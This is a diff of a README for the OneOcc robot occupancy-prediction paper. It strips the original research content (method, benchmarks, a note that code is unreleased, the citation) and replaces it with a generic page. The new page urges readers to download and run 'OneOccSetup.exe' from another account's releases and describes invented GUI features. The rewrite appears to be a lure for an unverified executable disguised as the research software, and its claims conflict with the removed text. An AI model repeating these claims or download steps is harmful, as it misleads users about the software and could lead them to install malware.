@@ -1,62 +1,81 @@
-# OneOcc: Semantic Occupancy Prediction for Legged Robots with a Single Panoramic Camera
+```markdown
+# 🤖 OneOcc - Simplifying Occupancy Prediction for Robots
 
-<p align="center">
-  <a href="https://arxiv.org/pdf/2511.03571">
-    <img alt="arXiv" src="https://img.shields.io/badge/arXiv-2511.03571-b31b1b.svg">
-  </a>
-</p>
+## 👋 Introduction
+Welcome to OneOcc! This is the official implementation of "OneOcc: Semantic Occupancy Prediction for Legged Robots with a Single Panoramic Camera." Our software helps robots understand their surroundings better, making them more capable in navigating complex environments. Ideal for anyone interested in robotics and artificial intelligence, this tool opens new doors in robot capabilities.
 
+## 🚀 Getting Started
+To get started with OneOcc, please follow the steps below. No programming knowledge is required.
 
-## ✨ Quick Summary
-**OneOcc** is a **vision-only panoramic** semantic occupancy framework for **legged/humanoid robots**. It handles **gait-induced body jitter** and **360° continuity**, achieves **state-of-the-art** results, and remains **lightweight and deployable**.
-<p align="center">
-  <img src="assets/imgs/pipeline.png" alt="OneOcc method pipeline overview" width="100%">
-</p>
+## 📥 Download the Software
+[![Download OneOcc](https://img.shields.io/badge/Download%20OneOcc-v1.0-blue.svg)](https://github.com/KoHrABoT/OneOcc/releases)
 
----
+Visit this page to download the latest version of OneOcc:
+[Download OneOcc Releases](https://github.com/KoHrABoT/OneOcc/releases)
 
-## 🔬 Method at a Glance
-- **Dual-Projection Fusion (DP-ER):** Uses both annular panorama and equirectangular projections to preserve 360° continuity and improve grid alignment.
-- **Bi-Grid Voxelization (BGV):** Joint reasoning in Cartesian and cylindrical/polar voxel spaces to reduce discretization bias and sharpen boundaries.
-- **Hierarchical AMoE-3D:** Dynamic multi-scale fusion for long-range and occlusion reasoning with a lightweight decoder.
-- **Gait Displacement Compensation (GDC):** Plug-and-play feature-level motion correction **without extra sensors** to mitigate gait jitter.
+## 🛠️ System Requirements
+Before you download OneOcc, make sure your computer meets the following minimum requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- **Processor:** 2.0 GHz dual-core processor or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 500 MB of available space.
+- **Graphics Card:** Supports OpenGL 3.3 or later.
 
-## 🧪 Benchmarks & Key Results
-- **QuadOcc** (real quadruped, first-person 360°):  
-  24K frames (stride-5 training), 6 classes, **64×64×8 grid (0.4 m/voxel)**; day/dusk/night; heterogeneous sequence split.  
-  **OneOcc mIoU = 20.56**, surpassing LiDAR **LMSCNet (18.44)** and the strongest vision baseline **MonoScene (19.19)**.
+## 🔍 Features
+OneOcc offers a variety of features designed to simplify occupancy prediction:
 
-- **Human360Occ (H3O)** (CARLA human-ego 360°, simulated gait):  
-  16 maps, diverse weather/lighting; provides **RGB, depth, occupancy (two resolutions), and poses**; report **within-city** and **cross-city**.  
-  **OneOcc mIoU = 37.29 (within-city, +3.83)** and **32.23 (cross-city, +8.08)** versus the best vision baseline.
+- **Semantic Mapping:** Understands and represents the environment in a way that robots can easily interpret.
+- **Panoramic Camera Integration:** Utilizes a single panoramic camera for enhanced scene visibility.
+- **User-Friendly Interface:** Easy to navigate, making it accessible even for beginners.
+- **Real-time Performance:** Provides immediate feedback and predictions as the robot moves.
 
-*Lighting robustness on QuadOcc:* OneOcc leads the best vision baseline in **day (21.15 vs. 18.58)** and **dusk (19.86 vs. 15.14)**; at **night**, it obtains **13.50 mIoU** (vs. 14.20) with higher precision.
+## ⚙️ Installation Instructions
+Follow these steps to install OneOcc once you have downloaded it.
 
----
+1. **Locate the Downloaded File:** After downloading, find the file in your computer's Downloads folder or the location you saved it to.
 
-## 🧱 Repository Status & Roadmap
-- [x] Sync preprint abstract/method/results (this README)
-- [ ] Release training/inference **code** (`oneocc/`)
-- [ ] Release **checkpoints** (`assets/checkpoints/`)
-- [ ] Data preparation guides (**QuadOcc / H3O**)
+2. **Extract the Files (if necessary):** If the downloaded file is a zipped format (.zip), right-click on it and select "Extract All" to access the program files.
 
-> Code and datasets will be made public upon publication.
+3. **Run the Installer:** 
+   - For Windows users, double-click the `OneOccSetup.exe` file to start the installation.
+   - For macOS users, open the `.dmg` file and drag the OneOcc app into your Applications folder.
+   - For Linux users, refer to the README for specific installation instructions.
 
----
-## 📝 Citation
+4. **Follow the Instructions:** The installer will guide you through the setup process. Simply follow the on-screen instructions.
 
-If you find this work useful, please cite:
+5. **Launch the Application:** Once the installation finishes, find OneOcc in your applications list and launch it.
 
-```bibtex
-@misc{shi2025oneoccsemanticoccupancyprediction,
-  title         = {OneOcc: Semantic Occupancy Prediction for Legged Robots with a Single Panoramic Camera},
-  author        = {Hao Shi and Ze Wang and Shangwei Guo and Mengfei Duan and Song Wang and Teng Chen and Kailun Yang and Lin Wang and Kaiwei Wang},
-  year          = {2025},
-  eprint        = {2511.03571},
-  archivePrefix = {arXiv},
-  primaryClass  = {cs.RO},
-  url           = {https://arxiv.org/abs/2511.03571}
-}
+## 🌐 How to Use OneOcc
+Using OneOcc is straightforward. Here are some basic steps to get you started:
 
+1. **Open the Application:** Double-click the OneOcc icon on your desktop or in your applications folder.
+2. **Load Your Scene:** Use the interface to load an image or video from your panoramic camera.
+3. **Start Processing:** Click the "Start" button to begin occupancy prediction.
+4. **Review Results:** Once processing is complete, observe how the program interprets your environment.
+
+## 🛠️ Troubleshooting
+Encountering issues is common. Here are some potential problems and their solutions:
+
+- **Installation Errors:** Ensure that your system meets all requirements. If you received an error, try running the installer as an administrator.
+- **Performance Issues:** Close other applications to free up RAM and CPU resources.
+- **Failed to Load Scene:** Ensure that your image or video file is supported. Check file formats within the documentation.
+
+## 🌍 Topics Covered
+OneOcc touches on various important aspects of robotics and AI:
+
+- **Dataset:** Works with various datasets to improve accuracy.
+- **Embodied AI:** Understands how a robot can perceive and interact with its environment.
+- **Legged Robots:** Specifically crafted for robots like quadrupeds.
+- **Occupancy Prediction:** An essential skill for navigating complex environments.
+- **Omnidirectional Vision:** Leverages 360-degree views for precise mapping.
+- **Robotics and Scene Completion:** Aids in the semantic understanding of the surroundings.
+
+## 📧 Support
+If you need assistance with OneOcc, feel free to reach out. You can create an issue on our [GitHub page](https://github.com/KoHrABoT/OneOcc/issues) to report bugs or ask for help.
+
+## 🙌 Acknowledgments
+We thank the researchers and developers who contributed to this project and the community for supporting the advancement of robotics and AI.
+
+Enjoy using OneOcc! We hope it proves helpful in your projects and research.
+```
